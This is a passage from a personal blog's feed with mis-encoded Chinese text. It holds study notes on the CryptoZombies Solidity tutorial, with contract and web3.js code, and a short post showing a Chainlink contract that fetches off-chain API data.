<span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æ³¨æ„ç§æœ‰å‡½æ•°çš„å‡½æ•°å</li></ul><hr><h3 id="ç¬¬10å…³ã€Œå‡½æ•°çš„è¿”å›å€¼å’Œä¿®é¥°ç¬¦ã€"><a href="#ç¬¬10å…³ã€Œå‡½æ•°çš„è¿”å›å€¼å’Œä¿®é¥°ç¬¦ã€" class="headerlink" title="ç¬¬10å…³ã€Œå‡½æ•°çš„è¿”å›å€¼å’Œä¿®é¥°ç¬¦ã€"></a>ç¬¬10å…³ã€Œå‡½æ•°çš„è¿”å›å€¼å’Œä¿®é¥°ç¬¦ã€</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_generateRandomDna</span> <span class="params">(string _str)</span> <span class="keyword">private</span> view <span class="title">returns</span><span class="params">(uint)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>privateå®šä¹‰ç§æœ‰å‡½æ•°ï¼Œå¤–é¢ä¸èƒ½è®¿é—®</li><li>viewå®šä¹‰åªæ˜¯æŸ¥çœ‹ï¼Œä¸å­˜æ•°æ®</li></ul><hr><h3 id="ç¬¬11å…³ã€ŒKeccackå’Œç±»å‹è½¬æ¢ã€"><a href="#ç¬¬11å…³ã€ŒKeccackå’Œç±»å‹è½¬æ¢ã€" class="headerlink" title="ç¬¬11å…³ã€ŒKeccackå’Œç±»å‹è½¬æ¢ã€"></a>ç¬¬11å…³ã€ŒKeccackå’Œç±»å‹è½¬æ¢ã€</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_generateRandomDna</span><span class="params">(string _str)</span> <span class="keyword">private</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        <span class="keyword">return</span> rand % dnaModulus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>sha3 å‡½æ•°md5ï¼Œsha2çš„å‡çº§ç‰ˆ keccak256(string)</li><li>ç±»å‹è½¬æ¢  uint8(uint256) ä½†æ˜¯å¥½åƒreturns(uint256)çš„æ—¶å€™è¿”å›uint8ä¹Ÿå¯ä»¥ï¼Œä¸ç”¨è½¬æ¢</li></ul><hr><h3 id="ç¬¬12å…³ã€Œæ•´åˆåˆ°ä¸€èµ·ã€"><a href="#ç¬¬12å…³ã€Œæ•´åˆåˆ°ä¸€èµ·ã€" class="headerlink" title="ç¬¬12å…³ã€Œæ•´åˆåˆ°ä¸€èµ·ã€"></a>ç¬¬12å…³ã€Œæ•´åˆåˆ°ä¸€èµ·ã€</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_generateRandomDna</span><span class="params">(string _str)</span> <span class="keyword">private</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        <span class="keyword">return</span> rand % dnaModulus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">createRandomZombie</span><span class="params">(string _name)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å®šä¹‰ä¸€ä¸ªåƒµå°¸ç»“æ„ä½“</li><li>å®šä¹‰ä¸€ä¸ªè£…åƒµå°¸çš„æ•°ç»„</li><li>å®šä¹‰ä¸€ä¸ªå‡½æ•°åˆ›å»ºåƒµå°¸ï¼ˆæ¥æ”¶åå­—å’ŒDNAï¼‰</li><li>å®šä¹‰ä¸€ä¸ªå‡½æ•°åˆ›å»ºdna</li><li>å®šä¹‰ä¸€ä¸ªå‡½æ•°åˆ›å»ºåƒµå°¸ï¼ˆæ¥æ”¶åå­— ï¼‰</li></ul><hr><h3 id="ç¬¬13å…³ã€Œeventã€"><a href="#ç¬¬13å…³ã€Œeventã€" class="headerlink" title="ç¬¬13å…³ã€Œeventã€"></a>ç¬¬13å…³ã€Œeventã€</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">event <span class="title">NewZombie</span><span class="params">(uint zombieId, string name, uint dna)</span></span>;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        uint id = zombies.push(Zombie(_name, _dna)) - <span class="number">1</span>;</span><br><span class="line">        NewZombie(id, _name, _dna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_generateRandomDna</span><span class="params">(string _str)</span> <span class="keyword">private</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        <span class="keyword">return</span> rand % dnaModulus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">createRandomZombie</span><span class="params">(string _name)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>äº‹ä»¶ æ˜¯åˆçº¦å’ŒåŒºå—é“¾é€šè®¯çš„ä¸€ç§æœºåˆ¶ ç›¸å½“äºè®©åŒºå—é“¾çŸ¥é“è¿™ä¸ªäº‹ä»¶ dappå¯ä»¥ç›‘å¬åŒºå—é“¾ä¸Šçš„è¿™ä¸ªäº‹ä»¶ï¼Œè·å¾—æ•°æ®ã€‚</li><li>è¿™å°±æ˜¯eventï¼Œéœ€è¦å®šä¹‰event xx (type xx)</li><li>ç„¶åè°ƒç”¨ xx(xx)</li></ul><hr><h3 id="ç¬¬14å…³ã€Œweb3-jsã€"><a href="#ç¬¬14å…³ã€Œweb3-jsã€" class="headerlink" title="ç¬¬14å…³ã€Œweb3.jsã€"></a>ç¬¬14å…³ã€Œweb3.jsã€</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸‹é¢æ˜¯è°ƒç”¨åˆçº¦çš„æ–¹å¼:</span></span><br><span class="line"><span class="keyword">var</span> abi = <span class="comment">/* abiæ˜¯ç”±ç¼–è¯‘å™¨ç”Ÿæˆçš„ */</span></span><br><span class="line"><span class="keyword">var</span> ZombieFactoryContract = web3.eth.contract(abi)</span><br><span class="line"><span class="keyword">var</span> contractAddress = <span class="comment">/* å‘å¸ƒä¹‹ååœ¨ä»¥å¤ªåŠä¸Šç”Ÿæˆçš„åˆçº¦åœ°å€ */</span></span><br><span class="line"><span class="keyword">var</span> ZombieFactory = ZombieFactoryContract.at(contractAddress)</span><br><span class="line"><span class="comment">// `ZombieFactory` èƒ½è®¿é—®å…¬å…±çš„å‡½æ•°ä»¥åŠäº‹ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æŸä¸ªç›‘å¬æ–‡æœ¬è¾“å…¥çš„ç›‘å¬å™¨:</span></span><br><span class="line">$(<span class="string">&quot;#ourButton&quot;</span>).click(function(e) &#123;</span><br><span class="line">  <span class="keyword">var</span> name = $(<span class="string">&quot;#nameInput&quot;</span>).val()</span><br><span class="line">  <span class="comment">//è°ƒç”¨åˆçº¦çš„ `createRandomZombie` å‡½æ•°:</span></span><br><span class="line">  ZombieFactory.createRandomZombie(name)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬ `NewZombie` äº‹ä»¶, å¹¶ä¸”æ›´æ–°UI</span></span><br><span class="line"><span class="keyword">var</span> event = ZombieFactory.NewZombie(function(error, result) &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) <span class="keyword">return</span></span><br><span class="line">  generateZombie(result.zombieId, result.name, result.dna)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å– Zombie çš„ dna, æ›´æ–°å›¾åƒ</span></span><br><span class="line"><span class="function">function <span class="title">generateZombie</span><span class="params">(id, name, dna)</span> </span>&#123;</span><br><span class="line">  let dnaStr = String(dna)</span><br><span class="line">  <span class="comment">// å¦‚æœdnaå°‘äº16ä½,åœ¨å®ƒå‰é¢ç”¨0è¡¥ä¸Š</span></span><br><span class="line">  <span class="keyword">while</span> (dnaStr.length &lt; <span class="number">16</span>)</span><br><span class="line">    dnaStr = <span class="string">&quot;0&quot;</span> + dnaStr</span><br><span class="line"></span><br><span class="line">  let zombieDetails = &#123;</span><br><span class="line">    <span class="comment">// å‰ä¸¤ä½æ•°æ„æˆå¤´éƒ¨.æˆ‘ä»¬å¯èƒ½æœ‰7ç§å¤´éƒ¨, æ‰€ä»¥ % 7</span></span><br><span class="line">    <span class="comment">// å¾—åˆ°çš„æ•°åœ¨0-6,å†åŠ ä¸Š1,æ•°çš„èŒƒå›´å˜æˆ1-7</span></span><br><span class="line">    <span class="comment">// é€šè¿‡è¿™æ ·è®¡ç®—ï¼š</span></span><br><span class="line">    headChoice: dnaStr.substring(<span class="number">0</span>, <span class="number">2</span>) % <span class="number">7</span> + <span class="number">1</span>ï¼Œ</span><br><span class="line">    <span class="comment">// æˆ‘ä»¬å¾—åˆ°çš„å›¾ç‰‡åç§°ä»head1.png åˆ° head7.png</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¥ä¸‹æ¥çš„ä¸¤ä½æ•°æ„æˆçœ¼ç›, çœ¼ç›å˜åŒ–å°±å¯¹11å–æ¨¡:</span></span><br><span class="line">    eyeChoice: dnaStr.substring(<span class="number">2</span>, <span class="number">4</span>) % <span class="number">11</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="comment">// å†æ¥ä¸‹æ¥çš„ä¸¤ä½æ•°æ„æˆè¡£æœï¼Œè¡£æœå˜åŒ–å°±å¯¹6å–æ¨¡:</span></span><br><span class="line">    shirtChoice: dnaStr.substring(<span class="number">4</span>, <span class="number">6</span>) % <span class="number">6</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="comment">//æœ€å6ä½æ§åˆ¶é¢œè‰². ç”¨cssé€‰æ‹©å™¨: hue-rotateæ¥æ›´æ–°</span></span><br><span class="line">    <span class="comment">// 360åº¦:</span></span><br><span class="line">    skinColorChoice: parseInt(dnaStr.substring(<span class="number">6</span>, <span class="number">8</span>) / <span class="number">100</span> * <span class="number">360</span>),</span><br><span class="line">    eyeColorChoice: parseInt(dnaStr.substring(<span class="number">8</span>, <span class="number">10</span>) / <span class="number">100</span> * <span class="number">360</span>),</span><br><span class="line">    clothesColorChoice: parseInt(dnaStr.substring(<span class="number">10</span>, <span class="number">12</span>) / <span class="number">100</span> * <span class="number">360</span>),</span><br><span class="line">    zombieName: name,</span><br><span class="line">    zombieDescription: <span class="string">&quot;A Level 1 CryptoZombie&quot;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> zombieDetails</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡web3.jsè°ƒç”¨ï¼Œç•™ç€ï¼Œä¸ä¼šjs</li></ul><hr><p>æ¸©ä¹ äº†ä¸€ésolidityï¼Œå¥½åƒå•¥ä¹Ÿæ²¡è·å–åˆ°</p><p>ä¸€ä¸ªDAPPçš„ä¸»è¦è¿˜æ˜¯åœ¨å‰ç«¯ï¼Œå°±åƒèµšé’±ä¸€æ ·ï¼Œæœ€å…ˆæ¥è§¦é’±çš„è¡Œä¸šã€å·¥ç§æ°¸è¿œæ˜¯æœ€èµšé’±çš„</p><p>ç–«æƒ…åŸå› è¿ç€ä¸€å‘¨å¾…åœ¨å®¿èˆ</p><p>æ¢§æ¡é“¾è¿›å†³èµ›äº†</p><p>tender</p><hr><p>1234567 mod 10^2 = 67</p><p>å› ä¸ºå–ä½™æ•°å°±æ˜¯æœ‰å¤šå°‘ä¸ª100ï¼Œå½“ç„¶æ˜¯12345ä¸ª100ï¼Œæ‰€ä»¥ä½™æ•°67</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;è®°å¾—å½“åˆæœ€å¼€å§‹å­¦è¿™ä¸ªæ•™ç¨‹çš„æ—¶å€™å¥½åƒè¿˜æ²¡æœ‰ä¸­æ–‡,&lt;br&gt;åæ¥solidityéƒ½å¿˜å¾—å·®ä¸å¤šäº†ï¼Œå“ˆå“ˆï¼Œ&lt;br&gt;æ²¡æƒ³åˆ°æ•™ç¨‹ç‰ˆæœ¬æ²¡å˜ï¼Œ&lt;br&gt;é‚£å°±æ¥æ¸©ä¹ ä¸‹0.4.19å§ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3 id=&quot;ç¬¬2å…³ã€Œåˆçº¦çš„åŸºç¡€ã€ï¼š&quot;</summary>
      
    
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://x1a0.net/categories/Solidity/"/>
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="åŠ å¯†åƒµå°¸" scheme="https://x1a0.net/tags/%E5%8A%A0%E5%AF%86%E5%83%B5%E5%B0%B8/"/>
    
  </entry>
  
  <entry>
    <title>Chinalinkåˆçº¦ä¸­è°ƒç”¨APIå®ä¾‹</title>
    <link href="https://x1a0.net/2021/12/14/Chinalink%E5%90%88%E7%BA%A6%E4%B8%AD%E8%B0%83%E7%94%A8API%E5%AE%9E%E4%BE%8B/"/>
    <id>https://x1a0.net/2021/12/14/Chinalink%E5%90%88%E7%BA%A6%E4%B8%AD%E8%B0%83%E7%94%A8API%E5%AE%9E%E4%BE%8B/</id>
    <published>2021-12-14T15:04:31.000Z</published>
    <updated>2021-12-15T06:39:05.204Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰ä½¿ç”¨çš„solidityç‰ˆæœ¬ï¼Œ^è¡¨ç¤ºå‘ä¸Šå…¼å®¹</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¼å…¥chainlinkclientåˆçº¦</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/ChainlinkClient.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract APIConsumer is ChainlinkClient &#123;</span><br><span class="line">    <span class="comment">//å¯¹äºusingï¼Œè¿™æ˜¯æˆ‘è§è¿‡æœ€å¥½ç†è§£çš„ä¾‹å­ï¼Œå½“ç„¶è§å¾—ä¹Ÿä¸å¤šï¼š</span></span><br><span class="line">    <span class="comment">// using A for B,è¿™é‡ŒAé€šå¸¸æ˜¯æŸä¸ªlibraryï¼ŒBæ˜¯æŸç§æ•°æ®ç±»å‹ï¼Œè¿™å¥è¯æ˜¯æŠŠAä¸­çš„æ–¹æ³•ç»‘å®šåˆ°Bç±»å‹ä¸Šï¼Œç›¸å½“äºç»™Bç±»å‹é™„åŠ äº†Aåº“ä¸­çš„æ–¹æ³•ã€‚ï¼ˆä¹Ÿæœ‰ç¿»è¯‘ä¸ºé™„ç€åº“çš„ï¼‰ æ¯”å¦‚ using SafeMath for uint256ï¼ŒSafeMathæ˜¯åº“ï¼Œfor uint256ï¼Œè¡¨ç¤ºï¼ŒSafeMathåº“ä¸­çš„æ–¹æ³•ç»‘å®šåˆ°uint256è¿™ä¸ªç±»å‹ï¼Œé‚£ä¹ˆuint256ç±»å‹çš„å®ä¾‹å¯ä»¥ç›´æ¥è°ƒç”¨SafeMathåº“ä¸­çš„æ‰€æœ‰æ–¹æ³•ï¼› ç„¶ååº“SafeMathé‡Œé¢æœ‰å®šä¹‰ä¸€ä¸ªadd(uint256 a,uint256 b)æ–¹æ³•ã€‚ æˆ‘ä»¬æœ‰ä¸€ä¸ªuint256 c;é‚£ä¹ˆå¯ä»¥è¿™æ ·è°ƒç”¨c.add(d)ï¼Œæ‰§è¡Œç»“æœç›¸å½“äºc+d, addæ–¹æ³•åœ¨å®šä¹‰çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šæ˜¯ä¸€ä¸ªuint256ç±»å‹çš„å˜é‡ï¼Œè¡¨ç¤ºè°ƒç”¨è€…ã€‚</span></span><br><span class="line">    using Chainlink <span class="keyword">for</span> Chainlink.Request;</span><br><span class="line">    uint256 public volume;</span><br><span class="line">    address private oracle;</span><br><span class="line">    bytes32 private jobId;</span><br><span class="line">    uint256 private fee;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Kovanæµ‹è¯•ç½‘é‡Œè¯­è¨€åŠèŠ‚ç‚¹ï¼Œjobidï¼Œéœ€è¦çš„linkä»£å¸</span></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        setPublicChainlinkToken();</span><br><span class="line">        oracle = <span class="number">0xc57B33452b4F7BB189bB5AfaE9cc4aBa1f7a4FD8</span>;</span><br><span class="line">        jobId = <span class="string">&quot;d5270d1c311941d0b08bead21fea7747&quot;</span>;</span><br><span class="line">        fee = <span class="number">0.1</span> * <span class="number">10</span> ** <span class="number">18</span>; <span class="comment">// (Varies by network and job)</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//å‘é€è¯·æ±‚ï¼Œå…¶ä¸­æœ‰â€getâ€œï¼šåœ°å€ï¼Œâ€pathâ€œï¼šè§£ææ–¹å¼</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">requestVolumeData</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bytes32 requestId</span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Chainlink.Request memory request = buildChainlinkRequest(jobId, address(<span class="built_in">this</span>), <span class="built_in">this</span>.fulfill.selector);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿™é‡Œèƒ½ç›´æ¥addå°±æ˜¯å› ä¸ºusing a for bäº†</span></span><br><span class="line">        request.add(<span class="string">&quot;get&quot;</span>, <span class="string">&quot;http://xx.xx.xx.xx:xx/getIssueEventsPollCon&quot;</span>);</span><br><span class="line"></span><br><span class="line">        request.add(<span class="string">&quot;path&quot;</span>, <span class="string">&quot;events&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sendChainlinkRequestTo(oracle, request, fee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å›è°ƒå‡½æ•°</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fulfill</span>(<span class="params">bytes32 _requestId, uint256 _volume</span>) <span class="title">public</span> <span class="title">recordChainlinkFulfillment</span>(<span class="params">_requestId</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        volume = _volume;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è°ƒç”¨å®Œrequestå‡½æ•°ä¹‹åï¼Œå†è®¿é—®volumeçš„å€¼ï¼Œå°±ä¼šå˜æˆUSDTç¨³å®šå¸æœ€æ–°ä¸€æ¬¡å¢å‘çš„æ•°é‡ã€‚</p><p>æ‰€ä»¥è¿™é‡Œå®Œæˆäº†é“¾ä¸‹è§¦å‘â€”â€”é“¾ä¸Šè°ƒç”¨APIâ€”â€”è¿”å›æœ€æ–°å¢å‘æ•°çš„è¿‡ç¨‹ã€‚</p><p>æœ¬æ¥13å·å°±è¯¥å‘çš„ï¼Œè ¢äº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span </summary>
      
    
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://x1a0.net/categories/Solidity/"/>
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="chainlink" scheme="https://x1a0.net/tags/chainlink/"/>
    
  </entry>
  
  <entry>
    <title>web3py-eventä½¿ç”¨å°è®°</title>
    <link href="https://x1a0.net/2021/12/13/web3py-event%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/"/>
    <id>https://x1a0.net/2021/12/13/web3py-event%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-12-13T10:24:28.000Z</published>
    <updated>2021-12-13T10:30:46.652Z</updated>
    
